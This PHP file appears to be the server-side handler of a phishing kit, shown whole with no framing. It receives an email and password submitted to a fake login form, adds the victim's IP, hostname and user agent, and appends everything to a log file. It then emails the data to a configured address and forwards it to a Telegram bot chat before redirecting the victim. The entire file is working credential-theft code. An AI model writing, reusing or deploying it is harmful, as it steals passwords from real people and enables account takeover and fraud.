<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Check if inputs are valid
if (!empty($email) && !empty($password)) {
    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    // Build the message for logging and notifications
    $message = <<<EOT
|-----------|Login Attempt|------------|
Email: {$email}
Password: {$password}
|-----------------------|
Client IP: {$ip}
GeoIP: http://www.geoiptool.com/?IP={$ip}
User Agent: {$userAgent}
|-----------------------|
EOT;

    // Save to logs folder
    try {
        $logsFolder = __DIR__ . '/logs'; // Specify folder location
        if (!is_dir($logsFolder)) {
            mkdir($logsFolder, 0755, true); // Create folder if it doesn't exist
        }
        $logFile = "{$logsFolder}/login_attempts.txt"; // Define the log file
        $logEntry = "[" . date('Y-m-d H:i:s') . "]\n{$message}\n\n";
        file_put_contents($logFile, $logEntry, FILE_APPEND); // Append data to the log file
    } catch (Exception $e) {
        error_log("Failed to write to log file: " . $e->getMessage());
        sendJsonResponse(false, "An error occurred while saving login data.");
        exit();
    }

    // Proceed with email sending (if configured in email.php)
    $subject = "Login Attempt: {$ip}";
    if (filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
        if (!mail($Receive_email, $subject, $message)) {
            error_log("Failed to send email to {$Receive_email}");
        }
    }

    // Telegram notification (if configured)
    $encodedMessage = urlencode($message);
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendmessage?chat_id={$id}&text={$encodedMessage}";
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $telegramUrl,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);

    if (!curl_exec($curl) || curl_errno($curl)) {
        error_log("Telegram API error: " . curl_error($curl));
    }

    curl_close($curl);

    // Respond to the frontend
    sendJsonResponse(true, "Login data has been recorded.", $redirect);
} else {
    sendJsonResponse(false, "Invalid input: Email or Password missing.");
}
?>
